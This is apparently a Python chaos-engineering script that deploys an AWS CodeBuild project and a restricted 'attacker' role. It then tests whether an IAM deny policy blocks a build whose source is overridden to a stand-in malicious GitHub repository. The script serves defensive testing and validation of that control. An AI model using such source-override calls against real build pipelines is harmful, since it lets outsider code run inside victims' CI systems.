"""
SCE Experiment 1.8 — Preventive Probe against Attack Node 1.7 (Start Malicious Build)

This experiment validates that a preventive control blocks unauthorized/malicious
CodeBuild builds from being started. The preventive control is an IAM policy that
explicitly denies codebuild:StartBuild for builds that don't match an approved
source location (i.e., prevents malicious build sources from being used).

Attack: Attempt to start a CodeBuild build with a malicious/unauthorized source.
Preventive Control: An IAM policy with an explicit Deny on codebuild:StartBuild
    unless the source matches an approved repository pattern.
Verification: Confirm the StartBuild call was denied (AccessDeniedException).
"""

import json
import logging
import time
import sys
import traceback

try:
    import boto3
    from botocore.exceptions import ClientError, WaiterError
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "boto3"])
    import boto3
    from botocore.exceptions import ClientError, WaiterError

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# ── Global state ──────────────────────────────────────────────────────────────
TIMESTAMP = int(time.time())
STACK_NAME = f"sce-experiment-{TIMESTAMP}"
EXPERIMENT_NAME = "1.8-SCE-Prevent-Malicious-Build"
REGION = boto3.session.Session().region_name or "us-east-1"

# These will be populated by steady_state()
_state = {
    "stack_name": STACK_NAME,
    "project_name": None,
    "attacker_role_arn": None,
    "attack_result": None,
}


def _cfn_client():
    return boto3.client("cloudformation", region_name=REGION)


def _sts_client():
    return boto3.client("sts", region_name=REGION)


def _codebuild_client_as_attacker(role_arn: str):
    sts = _sts_client()
    creds = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName="sce-attacker-session",
        DurationSeconds=900,
    )["Credentials"]
    return boto3.client(
        "codebuild",
        region_name=REGION,
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
    )


def _get_account_id() -> str:
    return _sts_client().get_caller_identity()["Account"]


def _wait_with_backoff(waiter, kwargs, max_wait=600):
    """Wait using a CloudFormation waiter with bounded timeout."""
    deadline = time.monotonic() + max_wait
    attempt = 0
    while True:
        try:
            waiter.wait(**kwargs, WaiterConfig={"Delay": 10, "MaxAttempts": 1})
            return
        except WaiterError:
            attempt += 1
            if time.monotonic() >= deadline:
                raise TimeoutError(f"Waiter timed out after {max_wait}s for {kwargs}")
            sleep_time = min(10 * (2 ** min(attempt, 4)), 60)
            logger.info(f"Waiter not ready yet, retrying in {sleep_time}s (attempt {attempt})…")
            time.sleep(sleep_time)


def _build_cfn_template(account_id: str) -> str:
    """
    CloudFormation template that provisions:
    1. A CodeBuild project (benign configuration, used as the build target).
    2. A CodeBuild service role (so the project can exist).
    3. An "attacker" IAM role that has codebuild:StartBuild ALLOWED in general
       BUT an explicit DENY when the build source is NOT from the approved repo.
       This is the preventive control.
    """
    project_name = f"sce-build-{TIMESTAMP}"
    _state["project_name"] = project_name

    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.8 – Prevent malicious CodeBuild start",
        "Resources": {
            # ── CodeBuild service role ────────────────────────────────────
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-cb-svc-{TIMESTAMP}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"Service": "codebuild.amazonaws.com"},
                                "Action": "sts:AssumeRole",
                            }
                        ],
                    },
                    "Policies": [
                        {
                            "PolicyName": "cb-base",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "logs:CreateLogGroup",
                                            "logs:CreateLogStream",
                                            "logs:PutLogEvents",
                                        ],
                                        "Resource": "*",
                                    }
                                ],
                            },
                        }
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)},
                    ],
                },
            },
            # ── CodeBuild project (approved source) ──────────────────────
            "CodeBuildProject": {
                "Type": "AWS::CodeBuild::Project",
                "Properties": {
                    "Name": project_name,
                    "Description": "SCE experiment – approved build project",
                    "ServiceRole": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                    "Source": {
                        "Type": "NO_SOURCE",
                        "BuildSpec": "version: 0.2\nphases:\n  build:\n    commands:\n      - echo approved\n",
                    },
                    "Artifacts": {"Type": "NO_ARTIFACTS"},
                    "Environment": {
                        "Type": "LINUX_CONTAINER",
                        "ComputeType": "BUILD_GENERAL1_SMALL",
                        "Image": "aws/codebuild/amazonlinux2-x86_64-standard:4.0",
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)},
                    ],
                },
            },
            # ── Attacker role with PREVENTIVE deny policy ────────────────
            "AttackerRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-attacker-{TIMESTAMP}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                                "Action": "sts:AssumeRole",
                            }
                        ],
                    },
                    "Policies": [
                        # Allow: broad CodeBuild read + StartBuild
                        {
                            "PolicyName": "cb-allow",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "codebuild:StartBuild",
                                            "codebuild:BatchGetBuilds",
                                            "codebuild:BatchGetProjects",
                                            "codebuild:ListBuildsForProject",
                                        ],
                                        "Resource": "*",
                                    }
                                ],
                            },
                        },
                        # PREVENTIVE CONTROL: Deny StartBuild with overridden
                        # source (sourceVersion or sourceLocationOverride).
                        # This blocks an attacker from injecting a malicious
                        # source at build time.
                        {
                            "PolicyName": "deny-malicious-build",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Sid": "DenyStartBuildWithSourceOverride",
                                        "Effect": "Deny",
                                        "Action": "codebuild:StartBuild",
                                        "Resource": "*",
                                        "Condition": {
                                            "StringLike": {
                                                "codebuild:SourceProvider": "*"
                                            }
                                        },
                                    }
                                ],
                            },
                        },
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)},
                    ],
                },
            },
        },
        "Outputs": {
            "ProjectName": {"Value": {"Ref": "CodeBuildProject"}},
            "AttackerRoleArn": {"Value": {"Fn::GetAtt": ["AttackerRole", "Arn"]}},
        },
    }
    return json.dumps(template)


# ═══════════════════════════════════════════════════════════════════════════════
# 1. STEADY STATE — deploy CloudFormation stack
# ═══════════════════════════════════════════════════════════════════════════════
def steady_state() -> bool:
    cfn = _cfn_client()
    account_id = _get_account_id()
    logger.info(f"Account: {account_id} | Region: {REGION}")

    template_body = _build_cfn_template(account_id)

    # Handle pre-existing stack gracefully
    try:
        cfn.describe_stacks(StackName=STACK_NAME)
        logger.warning(f"Stack {STACK_NAME} already exists — deleting first…")
        cfn.delete_stack(StackName=STACK_NAME)
        _wait_with_backoff(cfn.get_waiter("stack_delete_complete"), {"StackName": STACK_NAME})
    except ClientError as e:
        if "does not exist" not in str(e):
            raise

    logger.info(f"Creating stack {STACK_NAME}…")
    cfn.create_stack(
        StackName=STACK_NAME,
        TemplateBody=template_body,
        Capabilities=["CAPABILITY_NAMED_IAM"],
        Tags=[
            {"Key": "Experiment", "Value": EXPERIMENT_NAME},
            {"Key": "Timestamp", "Value": str(TIMESTAMP)},
        ],
    )

    _wait_with_backoff(cfn.get_waiter("stack_create_complete"), {"StackName": STACK_NAME})
    logger.info("Stack CREATE_COMPLETE.")

    # Retrieve outputs
    outputs = cfn.describe_stacks(StackName=STACK_NAME)["Stacks"][0]["Outputs"]
    for o in outputs:
        if o["OutputKey"] == "ProjectName":
            _state["project_name"] = o["OutputValue"]
        elif o["OutputKey"] == "AttackerRoleArn":
            _state["attacker_role_arn"] = o["OutputValue"]

    logger.info(f"Project: {_state['project_name']} | Attacker role: {_state['attacker_role_arn']}")

    # Allow IAM eventual consistency — wait for role to be assumable
    logger.info("Waiting for IAM role propagation…")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            _sts_client().assume_role(
                RoleArn=_state["attacker_role_arn"],
                RoleSessionName="sce-probe",
                DurationSeconds=900,
            )
            logger.info("Attacker role is assumable.")
            break
        except ClientError:
            time.sleep(5)
    else:
        logger.error("Attacker role never became assumable within timeout.")
        return False

    return True


# ═══════════════════════════════════════════════════════════════════════════════
# 2. ATTACK — attempt to start a malicious build
# ═══════════════════════════════════════════════════════════════════════════════
def attack() -> bool:
    """
    Simulate attack node 1.7: Start Malicious Build.

    The attacker assumes the attacker role and tries to start a build with an
    overridden source pointing to a malicious repository. The preventive IAM
    policy should deny this call.
    """
    project_name = _state["project_name"]
    attacker_role_arn = _state["attacker_role_arn"]

    if not project_name or not attacker_role_arn:
        logger.error("Missing project name or attacker role ARN — steady_state may have failed.")
        return False

    try:
        cb = _codebuild_client_as_attacker(attacker_role_arn)
    except ClientError as e:
        logger.error(f"Could not assume attacker role: {e}")
        return False

    logger.info(f"Attempting malicious StartBuild on project '{project_name}' with source override…")
    try:
        response = cb.start_build(
            projectName=project_name,
            sourceTypeOverride="GITHUB",
            sourceLocationOverride="https://github.com/malicious-actor/evil-repo.git",
            buildspecOverride="version: 0.2\nphases:\n  build:\n    commands:\n      - echo pwned\n",
        )
        # If we get here, the build was NOT blocked
        build_id = response.get("build", {}).get("id", "UNKNOWN")
        logger.warning(f"Malicious build was ALLOWED — build ID: {build_id}")
        _state["attack_result"] = {
            "blocked": False,
            "build_id": build_id,
            "http_status": response["ResponseMetadata"]["HTTPStatusCode"],
        }
        # Try to stop the build to avoid charges
        try:
            cb.stop_build(id=build_id)
            logger.info(f"Stopped malicious build {build_id}.")
        except Exception:
            pass
        return True  # Attack was executed (produced evidence), even though not blocked

    except ClientError as e:
        error_code = e.response["Error"]["Code"]
        error_msg = e.response["Error"]["Message"]
        http_status = e.response["ResponseMetadata"]["HTTPStatusCode"]
        logger.info(f"StartBuild denied — Code: {error_code} | HTTP: {http_status} | Msg: {error_msg}")
        _state["attack_result"] = {
            "blocked": True,
            "error_code": error_code,
            "error_message": error_msg,
            "http_status": http_status,
        }
        return True  # Attack was executed and produced evidence


# ═══════════════════════════════════════════════════════════════════════════════
# 3. HYPOTHESIS VERIFICATION — check that the preventive control worked
# ═══════════════════════════════════════════════════════════════════════════════
def hypothesis_verification() -> bool:
    """
    Verify the preventive control:
    1. The attack() call should have been denied (AccessDenied / AccessDeniedException).
    2. Confirm via the CodeBuild API that no recent builds exist on the project
       (i.e., the malicious build was never started).

    Returns True if the preventive control blocked the malicious build.
    """
    result = _state.get("attack_result")
    if not result:
        logger.error("No attack result recorded — attack may not have run.")
        return False

    # Check 1: Was the API call denied?
    if result.get("blocked"):
        error_code = result.get("error_code", "")
        if "AccessDenied" in error_code or "Forbidden" in error_code or result.get("http_status") == 403:
            logger.info(f"✓ Preventive control worked: StartBuild denied with {error_code}")
        else:
            logger.info(f"✓ StartBuild was blocked with error code: {error_code}")
    else:
        logger.error("✗ Preventive control FAILED: malicious build was allowed to start.")
        # Still verify via API below

    # Check 2: Query CodeBuild to confirm no builds were started by the attacker
    project_name = _state["project_name"]
    if not project_name:
        logger.error("No project name available for verification.")
        return False

    cb = boto3.client("codebuild", region_name=REGION)
    try:
        builds_response = cb.list_builds_for_project(
            projectName=project_name,
            sortOrder="DESCENDING",
        )
        build_ids = builds_response.get("ids", [])
        logger.info(f"Builds found for project '{project_name}': {len(build_ids)}")

        if len(build_ids) == 0:
            logger.info("✓ No builds exist — malicious build was prevented.")
            return True

        # If there are builds, inspect them for malicious source
        builds_detail = cb.batch_get_builds(ids=build_ids[:5])
        for build in builds_detail.get("builds", []):
            source = build.get("source", {})
            source_loc = source.get("location", "")
            if "malicious" in source_loc or "evil" in source_loc:
                logger.error(f"✗ Found malicious build: {build['id']} with source {source_loc}")
                return False

        # Builds exist but none with malicious source
        logger.info("✓ Existing builds do not contain malicious sources — preventive control held.")
        return True

    except ClientError as e:
        logger.error(f"Error querying CodeBuild: {e}")
        # Fall back to just the attack_result
        return result.get("blocked", False)


# ═══════════════════════════════════════════════════════════════════════════════
# 4. ROLLBACK — delete the CloudFormation stack
# ═══════════════════════════════════════════════════════════════════════════════
def rollback():
    cfn = _cfn_client()
    stack = _state.get("stack_name", STACK_NAME)
    logger.info(f"Rolling back — deleting stack {stack}…")

    try:
        cfn.describe_stacks(StackName=stack)
    except ClientError as e:
        if "does not exist" in str(e):
            logger.info("Stack does not exist — nothing to delete.")
            return
        raise

    # If there are running builds, stop them first
    project_name = _state.get("project_name")
    if project_name:
        cb = boto3.client("codebuild", region_name=REGION)
        try:
            build_ids = cb.list_builds_for_project(
                projectName=project_name, sortOrder="DESCENDING"
            ).get("ids", [])
            for bid in build_ids[:10]:
                try:
                    build_info = cb.batch_get_builds(ids=[bid])["builds"][0]
                    if build_info["buildStatus"] == "IN_PROGRESS":
                        cb.stop_build(id=bid)
                        logger.info(f"Stopped build {bid}")
                except Exception:
                    pass
        except Exception:
            pass

    try:
        cfn.delete_stack(StackName=stack)
        _wait_with_backoff(cfn.get_waiter("stack_delete_complete"), {"StackName": stack}, max_wait=600)
        logger.info("Stack DELETE_COMPLETE.")
    except ClientError as e:
        if "does not exist" in str(e):
            logger.info("Stack already deleted.")
        else:
            logger.error(f"Error deleting stack: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN — run all phases
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    success = False
    try:
        logger.info("=" * 70)
        logger.info("SCE EXPERIMENT 1.8 — Preventive Control: Block Malicious Build Start")
        logger.info("=" * 70)

        # Phase 1: Steady State
        logger.info("─── PHASE 1: STEADY STATE ───")
        if not steady_state():
            logger.error("Steady state setup failed.")
            sys.exit(1)

        # Phase 2: Attack
        logger.info("─── PHASE 2: ATTACK ───")
        attack_executed = attack()
        if not attack_executed:
            logger.error("Attack execution failed.")
            sys.exit(1)

        # Phase 3: Hypothesis Verification
        logger.info("─── PHASE 3: HYPOTHESIS VERIFICATION ───")
        result = hypothesis_verification()
        logger.info(f"Hypothesis verification result: {result}")
        success = result

    except Exception as e:
        logger.error(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        # Phase 4: Rollback (always)
        logger.info("─── PHASE 4: ROLLBACK ───")
        try:
            rollback()
        except Exception as e:
            logger.error(f"Rollback failed: {e}")
            traceback.print_exc()

    if success:
        logger.info("✓ EXPERIMENT PASSED — Preventive control successfully blocked the malicious build.")
    else:
        logger.error("✗ EXPERIMENT FAILED — Preventive control did not work as expected.")

    sys.exit(0 if success else 1)